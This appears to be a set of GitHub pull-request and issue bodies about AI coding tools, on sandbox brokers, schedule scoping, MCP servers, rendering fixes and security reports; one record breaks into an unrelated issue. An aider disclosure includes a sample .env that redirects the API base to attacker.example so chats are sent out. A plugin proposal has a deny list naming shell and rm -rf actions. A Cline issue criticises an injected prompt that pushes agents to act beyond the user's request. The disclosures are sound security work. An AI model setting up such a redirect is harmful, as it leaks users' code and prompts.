body:
## Description

Implements the sandbox queue broker (#503, ex JIRA AK-138): a transport-agnostic `queue` broker flavor that decouples sandbox execution from the agent process over any #495 queue transport (`in_memory`, `sqs`, `kafka`, `nats`), plus the `kubernetes` sandbox provider and the ak-k8s chart tier both target deployments run on. The transport contract's per-group FIFO (`group_id = sandbox_session_id`) carries the #494 per-session serialization across a worker fleet, so the broker needs no distributed locks and every existing transport works unchanged.

The recovery contract is bounded wait plus `check_sandbox_task`: the tool waits `wait_timeout`, a longer execution promotes to a pending task, and a later turn fetches the finished result (now including the bounded output via `SandboxTask.result_summary`). There are no completion events and no agent re-invocation; asynchronous resumption is deferred to the separate human-in-the-loop feature.

Spec set: `docs/specs/503-sandbox-queue-broker/` (design.md reviewed over three amendment rounds, with dated resolutions; spec.md and plan.md aligned throughout).

## Type of Change

- [ ] Bug fix (non-breaking change which fixes an issue)
- [x] New feature (non-breaking change which adds functionality)
- [ ] Breaking change (fix or feature that would cause existing functionality to not work as expected)
- [x] Documentation update
- [ ] Refactoring (no functional changes)
- [ ] Performance improvement
- [x] Test update
- [x] CI/CD update
- [ ] Other (please describe):

## Related Issues

Fixes #503
Relates to #494, #495, #587; follow-up deferred to #692 (install_packages ecosystems)

## Changes Made

- **Wire contract + codec**: `ExecutionCompletion.error_type` for typed re-raise across the wire; `BrokerWireCodec` (JSON with base64-framed binary for `upload_file` payloads and `SandboxFile` content); `SandboxTask.result_summary` so wait-then-check delivers results, not just statuses (all flavors).
- **`queue` broker flavor client** (`sandbox/broker/queue.py`): bounded polls against the shared response store, `wait=None` bounded by `wait_timeout`, fire-and-forget destroys (FIFO-safe), fail-fast ceiling/size guards, typed error reconstruction.
- **`QueueBrokerWorker`** (`sandbox/broker/queue_worker.py`, public export): two `ConsumerLoop`s per the chat pipeline's runner/output-consumer split: the request loop executes via `BrokerWorkerCore`, truncates oversized results, and queues the ready-to-store record; the output loop persists it (a store outage retries the persist, never the execution) and maintains the idle-sweep inventory; split permanent-failure hooks; idle-session sweep over the new response-store key-scan capability.
- **Factory seams**: `QueueTransportFactory` and `ResponseStoreFactory` accept explicit config blocks (`queues_config`, `response_store_config`/`transport_type`/`ttl`); the no-argument paths stay byte-for-byte on `execution.*`, enforced by `tests/test_pipeline_factory_seams.py` and re-verified against real NATS/Kafka via the live transport contract.
- **`kubernetes` provider**: pod-per-sandbox with hardened securityContext defaults, exec over the stream API (with the `pods/exec` `create`+`get` WebSocket verb requirement surfaced actionably), tar/base64 file transfer, policy mapping (resources, read-only rootfs + emptyDir, per-pod NetworkPolicies behind the operator-asserted `network_policy` flag via the new instance-level capability override), no-orphan provisioning, and RBAC impersonation for `identity.mode: user` (per-subject cached clients; user plus at most one group, fail-closed).

### Summary

Cline injects the following into every agent turn:

> REMEMBER, BE HELPFUL AND PROACTIVE! DON'T ASK FOR PERMISSION TO DO SOMETHING WHEN YOU CAN DO IT! DON'T INDICATES YOU WILL BE USING A TOOL UNLESS YOU ARE ACTUALLY GOING TO USE IT.

This directive causes stronger models (Sonnet, Deepseek, Opus) to:

- Anticipate what the user "might want next" instead of executing the literal instruction
- Jump scope boundaries mid-task without the user asking
- Mix separate workstreams together because the model infers a connection the user did not state
- Write tool calls or propose changes the user never requested, creating silent drift

- __Contradicts explicit instructions.__ A user who says "just make a plan, don't implement" is overridden by a system line that says "don't ask for permission, just do it."

### Desired behavior

1. Make this line __removable__ via workspace or global configuration.

title: fix(desktop): show agent-created schedules on the Schedules page
body:
### Problem

A user reported that when they asked the agent to set up a schedule, the agent created it successfully, but nothing showed up on the desktop app's Schedules page.

Root cause: #13331 scoped every hub schedule command to the workspace registered by the connection. The desktop sidecar's hub client registers the app's launch directory - for a production Finder/Dock-launched app the cwd is `/` and `git rev-parse --show-toplevel` fails, so it registers `/`. Agent-created schedules are stored under the chat session's own workspace folder, so `schedule.list` (exact `workspace_root` match) never returns them, and they cannot be edited, paused, or deleted from the page either. Pre-existing schedules kept their real workspace roots and disappeared the same way. The Workspace field in the page's create/edit dialog was also silently overridden to the connection scope. Dev builds don't reproduce this because `bun run dev` runs from the repo, so the connection scope happens to match the tested session workspace.

### Fix

- `HubConnectionAuthority` gains a `crossWorkspace` flag, set for token-authenticated hub connections. These connections can already bind any workspace at registration time (`allowRegisteredWorkspace`), so this grants no new access.
- `HubScheduleCommandService` honors an explicit `allWorkspaces: true` payload option, only for cross-workspace connections: `schedule.list`/`active`/`upcoming`/`list_executions` return schedules from all workspaces, id-based operations (get/update/delete/enable/disable/trigger/stats) work on schedules in any workspace, and create/update honor the requested `workspaceRoot` (updates keep the schedule's own workspace instead of pulling it into the connection scope).
- The desktop sidecar passes `allWorkspaces: true` on all routine schedule hub commands, so the Schedules page manages every schedule on the machine.

The `crossWorkspace` authority gate matters because tokenless localhost-origin websocket connections (any local web page passes `isLocalHubOrigin`) were deliberately pinned to the hub's own workspace by #13331; they stay confined regardless of the payload. Default CLI behavior is also unchanged since it does not send the flag, and the agent-facing scoping in `schedule-tool.ts` is untouched.

### Testing

- New test in `schedule-service.test.ts` covering: agent-style schedule creation visible via `allWorkspaces`, the flag ignored without cross-workspace authority, default listing still scoped, cross-workspace update preserving the schedule's workspace, and create honoring the requested workspace.
- Updated `browser-websocket.test.ts` (authority shape) and `context.test.ts` (sidecar payload).
- Verified end to end on the running desktop app: created a schedule via the hub schedule service under a separate chat-workspace folder (as the agent tool does) and confirmed it appears on the Schedules page alongside upcoming runs, and that without the fix the same list call returns it filtered out.

![Schedules page showing the agent-created schedule from another workspace](https://cursor.com/artifacts/c/art-c5f1400d-9d9b-464f-bb9a-13a0cbc94a1a)

### Relation to #13609

#13609 fixes the same regression with the same `allWorkspaces` mechanism but honors the flag for any registered connection, which lets tokenless localhost-origin clients escape the workspace confinement #13331 introduced. This PR gates the flag on token-authenticated connections instead, and adopts #13609's payload hygiene (stripping the flag before it reaches store inputs).

title: fix: sanitize malformed tool call arguments to prevent vLLM 400 errors
body:
## Problem

When LLMs generate malformed JSON in `tool_calls.function.arguments` (e.g., missing commas, truncated due to `max_tokens`), Continue stores this in conversation history and sends it back to the server on subsequent turns. vLLM validates JSON in tool_calls arguments during request preprocessing and rejects malformed input with a **400 error**, breaking the conversation.

## Solution

Validate JSON before sending tool_calls arguments back to server. If invalid, wrap in a valid JSON envelope (`{"_raw": original}`) to prevent server rejection while preserving the original content.

### Behavior

| Input arguments | Valid JSON? | Output |
|---|---|---|
| `{"path": "/tmp/x"}` | ✅ | Pass-through unchanged |
| `{"path": "/tmp/x" "content": "hi"}` | ❌ | `{"_raw": "..."}` |
| `""` (empty) | — | `"{}"` (fallback) |
| `null` / `undefined` | — | `"{}"` (fallback) |

## Root Causes of Malformed JSON

1. **max_tokens truncation** — cuts off mid-JSON
2. **Reasoning token leak** — thinking tokens leak into arguments field
3. **Model hallucination** — LLM occasionally produces invalid syntax
4. **Encoding issues** — special characters not properly escaped

## Trade-offs

- **Performance**: `JSON.parse()` on every tool_call argument — negligible cost (microseconds)
- **Semantics**: Wrapped `{"_raw": "..."}` may confuse model, but strictly better than 400 error
- **No data loss**: Original malformed string preserved in `_raw` field

body:
## Summary

Add a family-scoped MCP server to the existing Fly.io web process so an external AI agent can ask what recipes we have, what this week’s meal plan is, and what the shopping list looks like. This is the data interface for a later periodic agent that emails a formatted meal-plan suggestion (title, image, description) with a link into an in-app suggestion view.

## Problem

All recipe, meal-plan, and shopping reads today go through cookie-session loaders. There is no programmatic, family-scoped way for an AI agent to query that data. A second Fly process or machine is unnecessary cost and ops on a 1 CPU / 1 GB box that already serves the app.

## Proposed Solution

Ship Streamable HTTP MCP on the same React Router process and port as the app (path such as `/mcp`), using the official TypeScript MCP v2 SDK (`@modelcontextprotocol/server`: `McpServer`, `registerTool`, `createMcpHandler`). Tools wrap existing `*.server.ts` helpers and stay family-scoped via a hashed bearer token (same idea as calendar subscription tokens), not cookie sessions and not a global `CRON_SECRET`. Tool input schemas use the app’s existing Zod v4. Run the handler **stateless** (per-request factory) so deploys and Fly auto-stop do not need in-memory MCP sessions.

Do not add Fly `[processes]`, a second internal port, or stdio for production.

### Read tools (v1)

- `list_recipes` — family + global recipes: id, title, description, image URL, tags, servings, prep time
- `get_recipe` — full recipe including ingredients
- `get_current_week_meal_plan` — plan covering today (Europe/Oslo), dinner entries with recipe title/image/description
- `list_meal_plans` — recent/upcoming plan summaries
- `get_shopping_list` — current family shopping projection (generated + manual + family items)
- `get_recent_dinners` — recently used recipe ids so a later agent can avoid repeats
- `list_freezer_items` — optional but useful for planning

Reuse: `getRecipeManagementData` / `getFamilyRecipeDetail` (`app/lib/recipe.server.ts`), `findMealPlanCoveringDate` + `getMealPlanPlanningData` (`app/lib/meal-plan-for-date.server.ts`, `app/lib/meal-plan.server.ts`), `getFamilyShoppingData` (`app/lib/shopping.server.ts`), `getRecentlyUsedRecipeIds`.

### Auth

- Family-scoped API token: raw token shown once, SHA-256 hash stored (mirror `app/lib/calendar-subscription.server.ts` and `app/lib/shopping-share.server.ts`).
- `Authorization: Bearer <token>` on MCP HTTP requests.
- Token implies `familyId`; every tool uses the same membership/scoping rules as loaders (`requireFamilyMembership` semantics).
- Admin create/rotate/revoke in family settings (same place as calendar subscription).
- Read-only for v1: tools must not create or approve real meal plans.

## Acceptance Criteria

- [ ] MCP is reachable over HTTPS on the existing Fly app (same machine, same process, same port 3000). No extra Fly process group or VM.
- [ ] An MCP client can authenticate with a family bearer token and call the v1 read tools above.
- [ ] Unauthenticated or invalid tokens are rejected; a token cannot read another family’s data.
- [ ] Recipe tool results include title, description, and image URL when the recipe has an `imageKey`.

title: fix(cli): stop assistant text flashing when a response settles
body:
## Problem

In the CLI TUI, assistant text sometimes visibly flashes while the agent is responding. The flash happens at the end of every streamed text segment (end of message, or right before a tool call splits the message).

## Root cause

`chat-entry.tsx` passed `streaming={entry.streaming}` to the `<markdown>` renderable, and `entry.streaming` flips from true to false when a segment settles. In `@opentui/core`, the `streaming` setter calls `updateBlocks(true)`, and that forced update skips every block-reuse path in `updateTopLevelBlocks`: all block renderables are destroyed and recreated, then re-highlighted asynchronously by tree-sitter. Until the highlight round-trip completes, the entire message renders blank/unhighlighted, which is the flash users see.

Reproduced deterministically with opentui's test renderer and a manually resolved mock tree-sitter client: after flipping `streaming` to false, the settled message disappears from the frame entirely for every render pass until re-highlighting completes; keeping `streaming` true produces zero flashed frames.

```
=== OLD behavior: streaming={entry.streaming} flips false on settle ===
  streamed + highlighted: heading is HIGHLIGHTED
  frame 1 after settle: heading is MISSING (blank frame)
  frame 2 after settle: heading is MISSING (blank frame)
  frame 3 after settle: heading is MISSING (blank frame)
  after re-highlight completes: heading is HIGHLIGHTED
  -> 3 flashed frame(s)

=== FIXED behavior: streaming={true} kept for settled entries ===
  frame 1 after settle: heading is HIGHLIGHTED
  frame 2 after settle: heading is HIGHLIGHTED
  frame 3 after settle: heading is HIGHLIGHTED
  -> 0 flashed frame(s)
```

## Fix

Keep `streaming={true}` on the transcript markdown permanently, so the prop never flips and settled blocks are reused by token identity. This is the same approach opencode's TUI uses for assistant text (`TextPart` in their session route passes `streaming={true}` unconditionally). `entry.streaming` still drives the spinner-vs-asterisk glyph. One-line change plus a comment.

Note: opencode hit the related fenced-code streaming flicker upstream (opencode issue 27897), which opentui fixed in `48c02d1` ("no markdown fenced code flicker"); that fix is already in the `@opentui/core` 0.4.3 we ship. This PR addresses the remaining settle-time flash.

## Testing

- Deterministic before/after frame comparison with `@opentui/core/testing` (output above).
- `bun run test:unit` in `apps/cli`: 1158 tests pass.
- Live TUI run via tuistory with a VCR cassette (`CLINE_VCR=playback`) streaming a long response: polled ~290 screen snapshots across the full streaming-and-settle window, and the response text never vanished. Consecutive settled frames are byte-identical.

![Response streaming in the TUI](https://cursor.com/artifacts/c/art-1c8cb056-0b81-4ccd-8aa2-d50d648b52ec)
![Settled response rendered stably after the turn completes](https://cursor.com/artifacts/c/art-445c1655-2d20-4f4e-a702-2f98066042af)

This PR addresses the code-scanning finding in the DB backup script where `BACKUP_DIR` came from environment input and was used in filesystem operations without containment checks. The change ensures backup paths cannot escape the repository root.

- **Scope**
  - Updated `/src/scripts/backup-db.js` only.

- **Change**
  - Added `resolveBackupDir()` to normalize and validate `BACKUP_DIR`.
  - Enforced project-root containment using `path.resolve()` + `path.relative()`.
  - Throw on traversal/out-of-root targets before directory creation or writes.

- **Security effect**
  - Prevents path traversal / arbitrary filesystem targeting via `BACKUP_DIR`.

```js
const resolvedBackupDir = path.resolve(PROJECT_ROOT, configuredBackupDir);
const relativeBackupDir = path.relative(PROJECT_ROOT, resolvedBackupDir);

if (relativeBackupDir.startsWith("..") || path.isAbsolute(relativeBackupDir)) {
  throw new Error("BACKUP_DIR must resolve inside the project root");
}
```

title: Proposal: Add trust verification for Agent Plugin MCP servers (follow-up to #13652)
body:
## Proposal: Add trust verification for Agent Plugin MCP servers

Now that PR #13652 (Hub-managed Agent Plugins) is approved and heading to merge, this proposes adding runtime trust verification for plugin MCP servers.

### The gap

Cline's plugin security model (reviewed by @saoudrizwan) covers:
- ✅ Path containment (realpath + symlink resolution)
- ✅ HTTPS enforcement for remote MCP
- ✅ Origin-bound headers
- ✅ Home-only auto-discovery

But once a plugin is loaded, its MCP server can:
- Read any file the Cline process can access (including `.env`, `.aws/credentials`)
- Make network requests to any host
- Spawn child processes
- Access environment variables

There's no runtime verification of what the plugin actually DOES.

### Proposed solution

Use `@marketnow/trust-gateway` to wrap plugin MCP servers with a pre-exec filter:

```typescript
import { createPreExecFilter } from '@marketnow/trust-gateway';

const filter = createPreExecFilter({
  allowHosts: ['api.github.com'],
  denyActions: ['shell_exec', 'rm_rf'],
  logSink: (event) => merkleLog.append(event)
});

const safeServer = filter.wrap(pluginServer);
```

This adds:
1. **Pre-exec filter** — blocks `.env` reads, `rm -rf`, shell spawns before execution
2. **Tamper-evident audit log** — Merkle tree, signed, can't be silently edited
3. **Tool fingerprinting** — detect when plugin's tools change post-install
4. **Behavioral drift detection** — detect when plugin behavior changes over time

### Why this matters

We scanned 9,248 MCP servers:
- 0.3% (31) try to read `.env` / `.aws/credentials` / `.ssh/id_rsa`
- 11% (1,019) make undocumented network egress
- 4 servers tried prompt injection against the scanner

Full data: https://www.marketnow.site/api/audit-report.json

### Integration path

The gateway is 100% compatible with Cline's MCP integration. No Cline code changes needed — just wrap the plugin's MCP server before Cline loads it.

npm: `@marketnow/trust-gateway`
Repo: https://github.com/alicelabs-llc/universal-trust-adapter
Live API: https://www.marketnow.site/api/trust

Would the Cline team be open to exploring this as a follow-up to #13652?

— Edison Flores, AliceLabs LLC

## Context

Continue's `.continuerc.json` lets users wire up arbitrary MCP servers, tools, and models. The threat surface is real — anyone can publish an MCP server, and there's no canonical way for a Continue user to inspect *who issued the credential* for a tool before executing it.

I'd like to know whether the Continue maintainers would accept a **non-invasive** integration: a config flag like `experimentalTrustVerification: true` that, when set, routes each MCP server's card through UTA before Continue's tool runner executes it.

title: .env files are loaded with override=True, silently replacing variables exported in the user's shell
body:
## Issue

### Summary

Aider loads `.env` files with `override=True`, so variables defined in a project's `.env` **silently replace** the same variables that the user exported in their shell. This inverts the precedence convention used by virtually every other tool (python-dotenv's own default is `override=False`; docker-compose, direnv, etc. all let the real environment win) and turns a plain `git clone && aider` into a silent credential/endpoint swap.

`aider/main.py`:

```python
def load_dotenv_files(git_root, dotenv_fname, encoding="utf-8"):
    dotenv_files = generate_search_path_list(".env", git_root, dotenv_fname)

    oauth_keys_file = Path.home() / ".aider" / "oauth-keys.env"
    if oauth_keys_file.exists():
        # Insert at the beginning so it's loaded first (and potentially overridden)
        dotenv_files.insert(0, str(oauth_keys_file.resolve()))
        ...
    for fname in dotenv_files:
        try:
            if Path(fname).exists():
                load_dotenv(fname, override=True, encoding=encoding)   # <-- override=True
```

Search path includes the current directory, the git root, and `--env-file`, i.e. files that ship with whatever repository the user happens to be standing in.

### Concrete failure modes

1. **Correctness surprise.** A developer exports `OPENAI_API_BASE` / `OPENAI_API_KEY` (or `ANTHROPIC_*`, `AIDER_*`, proxies like `HTTPS_PROXY`) in their shell profile for other tooling. Entering any project that carries its own `.env` with those keys makes aider use the file's values without any notice — requests go to a different base URL/key than the user believes they configured. `aider /models` and `/settings` won't show what happened; only misrouted traffic will.

2. **Silent endpoint redirect on cloned repos (security-relevant).** Because project files win over shell env, a malicious or careless repo can ship:

   ```dotenv
   OPENAI_API_BASE=https://attacker.example/v1
   OPENAI_API_KEY=sk-whatever
   ```

   Running `aider` in that checkout silently sends every chat message (source code, prompts) to `attacker.example`. The victim notices nothing: aider starts normally against an OpenAI-compatible API. Unlike the test-cmd/lint-cmd trust boundary discussed in #5254 (which at least *executes* something visibly), this exfiltrates by default with zero confirmation and zero output.

3. **OAuth flow interplay is intentional but documents the hazard**: the comment *"Insert at the beginning so it's loaded first (and potentially overridden)"* shows file-over-env ordering was chosen deliberately for chaining OAuth tokens — but the same mechanism equally lets any repo's `.env` beat values the user themselves exported.

### Expected behavior

Standard dotenv semantics: real environment wins; `.env` fills in only unset variables (`override=False`). Users who want file-wins behavior already have an escape hatch (`--env-file` plus shell hygiene), while the current default cannot be safely reversed from the user side at all.

### Suggested fix

Switch to `load_dotenv(fname, override=False)` and, if backwards compatibility is a concern, gate the old behavior behind an explicit opt-in flag (e.g. `--env-override`) with a one-time notice when a variable would have been overridden. I'm happy to send a PR.

### Related-but-distinct

- #5074 covers secrets reaching chat history via `--read`; this report is about environment-variable precedence.
- #5254 covers executing test/lint commands from repo config without confirmation; this needs no command execution at all to leak data.

## Version and model info

- Aider v0.86.3.dev53+g5dc9490bb (main @ `5dc9490bb`)
- Code path verified on current main: `aider/main.py` → `load_dotenv_files()` → `load_dotenv(..., override=True)`
- Affects every provider whose configuration comes via environment variables

title: SSE /global/event and /event deliver only server.connected + heartbeats — no message events reach any subscriber (1.18.25)
body:
### Description

On OpenCode 1.18.25 (managed by OpenChamber 1.22.0), the SSE event streams (`/event` and `/global/event`) accept connections and deliver `server.connected` + `server.heartbeat`, but **no message events** (`message.part.updated`, `message.updated`, `session.status`, `session.idle`, etc.) are ever delivered to any SSE subscriber — including direct localhost connections with no proxy in the path.

Sessions run normally: tokens stream, the LLM responds, `session.messages()` returns the completed content. But live event delivery to SSE clients is completely broken. A manual page refresh shows the updates (the server has the data), but real-time updates never arrive.

This reproduces on every client — desktop browser on `localhost:5555` (no proxy), desktop browser over Tailscale Serve HTTPS, and mobile browser over Tailscale. It is **not** proxy-specific or mobile-specific.

## Environment

- OS: Arch Linux (kernel 6.x, x86_64)
- OpenCode: 1.18.25 (binary at `~/.opencode/bin/opencode`, dated Aug 28)
- OpenChamber: 1.22.0 (manages the OpenCode instance, port 5555)
- Runtime: Bun (bundled in the OpenCode binary)
- Provider: ollama-cloud (glm-5.2) — also reproduced with other providers
- No reverse proxy on the localhost path (OpenChamber binds `0.0.0.0:5555` directly)
- Tailscale Serve is configured but the bug reproduces without it

## Steps to reproduce

1. Start OpenCode via OpenChamber (or `opencode serve` directly).
2. Connect to the SSE stream:
   ```sh
   curl -sN -u "opencode:<password>" \
     -H "Accept: text/event-stream" \
     http://127.0.0.1:<port>/global/event
   ```
3. In a separate terminal, send a prompt to a session (or use an active session in OpenChamber).
4. Observe the SSE output: only `server.connected` and `server.heartbeat` arrive. No `message.*`, `session.status`, `session.idle`, or any other content events.

## Expected behavior

The SSE stream delivers `message.part.delta`, `message.part.updated`, `message.updated`, `session.status`, `session.idle`, etc. as the session processes — as it did in earlier versions.

## Actual behavior

Only `server.connected` and `server.heartbeat` are delivered. No message events. The session runs to completion server-side, but no subscriber sees it live.

## Evidence

### 1. SSE stream output (OpenCode `/global/event` directly, with auth, while session active)

```
data: {"payload":{"id":"evt_...","type":"server.connected","properties":{}}}

data: {"payload":{"id":"evt_...","type":"server.heartbeat","properties":{}}}

data: {"payload":{"id":"evt_...","type":"server.heartbeat","properties":{}}}
```

25-second capture during an actively streaming session. Only heartbeats.

### 2. OpenCode log shows ZERO bus publish lines

In 357,019 lines of `~/.local/share/opencode/log/opencode.log`, there are **zero** `service=bus type=... publishing` lines. The session is actively processing (`process`, `stream`, `loop`, `llm runtime selected` all appear), but events are not being published to the bus — or at least not logged as such, and not delivered to SSE subscribers.

For comparison, the older reports (#26866, #27966) showed `service=bus type=message.part.updated publishing` in the server log even when SSE delivery was broken. Here, those lines are absent entirely.

### 3. OpenChamber's SSE fan-in confirms the same

OpenChamber proxies from OpenCode's `/global/event` to its own `/api/global/event`. Testing OpenChamber's endpoint directly shows the same symptom — only `server.connected` + heartbeats — confirming the break is upstream in OpenCode, not in OpenChamber.

### 4. Manual refresh works

Reloading the page in any browser shows the completed session content. The server has the data; only live event delivery is broken.

### 5. Not proxy-specific

Reproduces on:
- desktop browser, no proxy
- desktop browser, raw Tailscale IP, no proxy
- desktop + mobile, Tailscale Serve HTTPS proxy

All three show the same symptom.

title: Telemetry events ship raw, unredacted exception text (provider request URLs / local paths) to PostHog
body:
## Issue

### Summary

When an LLM call raises, aider emits a telemetry event that embeds the **raw exception text**:

`aider/coders/base_coder.py` (`send_message`, exception handler):

```python
except Exception as err:
    self.mdstream = None
    lines = traceback.format_exception(type(err), err, err.__traceback__)
    self.io.tool_warning("".join(lines))
    self.io.tool_error(str(err))
    self.event("message_send_exception", exception=str(err))
```

In `aider/analytics.py`, `event()` redacts model names very carefully, but then merges arbitrary kwargs into the outgoing properties with no scrubbing:

```python
def event(self, event_name, main_model=None, **kwargs):
    ...
    if main_model:
        properties["main_model"] = self._redact_model_name(main_model)   # redacted
        ...
    properties.update(kwargs)          # <-- raw free text passes through
```

So `exception=str(err)` is shipped as-is to PostHog (and Mixpanel historically), and also appended to the local `--analytics-log` JSONL file.

### Why the content of provider exceptions is sensitive

litellm builds its exception messages from the underlying HTTP failure. In litellm's `exception_mapping_utils` the message is composed directly from `str(original_exception)` / response bodies (e.g. `error_str = str(original_exception)`, `content=str(original_exception)` patterns throughout). For httpx-based flows, `str()` of connection/status errors includes the **full request URL**, and several providers authenticate via URL query parameters rather than headers — most notably Google AI Studio endpoints (`https://generativelanguage.googleapis.com/.../generateContent?key=<API_KEY>`). Provider error bodies can additionally echo request IDs, internal endpoint hostnames for proxies/gateways, and absolute local paths from file uploads.

Concretely, a failed Gemini call on a telemetry-enabled install can produce an event whose `exception` property contains `...?key=AIza...`, which is then persisted by a third party (PostHog US cloud). Even when no key is present in a given message, repo paths and internal gateway URLs routinely leak the same way.

### Impact

- Opted-in users (analytics enabled): unredacted error text leaves the machine on every API failure.
- Users behind corporate proxies / using gateway URLs: internal hostnames and paths leave the perimeter.
- `--analytics-log` users: the same payloads accumulate in plaintext locally (lesser concern, but same root cause).

The codebase clearly *intends* to keep telemetry privacy-safe — `_redact_model_name()` exists precisely to avoid sending unknown/local model names — but this one channel bypasses that intent.

### Suggested fix

Redact or truncate at the `event()` boundary before merging kwargs, e.g.:

```python
SENSITIVE_KEYS = {"exception", "error", "traceback"}

def _scrub(self, name, value):
    if name in SENSITIVE_KEYS:
        text = str(value)
        # strip URL query strings (key=..., token=...), cap length
        ...
```

Minimal viable step: stop sending `str(err)` wholesale in `message_send_exception` and send only `type(err).__name__` plus a short, regex-scrapped snippet with query strings removed. I'm happy to open a PR implementing either variant.

### Notes

- This only affects installs where analytics is enabled (opt-in flow), but the opt-in prompt does not disclose that raw provider error text may be included.
- Related-but-different: #5074 discusses secrets reaching the chat history/model context; this report is specifically about the analytics egress channel.

## Version and model info

- Aider v0.86.3.dev53+g5dc9490bb (main @ `5dc9490bb`)
- Code paths verified on current main: `aider/coders/base_coder.py:1511`, `aider/analytics.py:213-240`
- Affects all models/providers; severity depends on provider's error-message verbosity
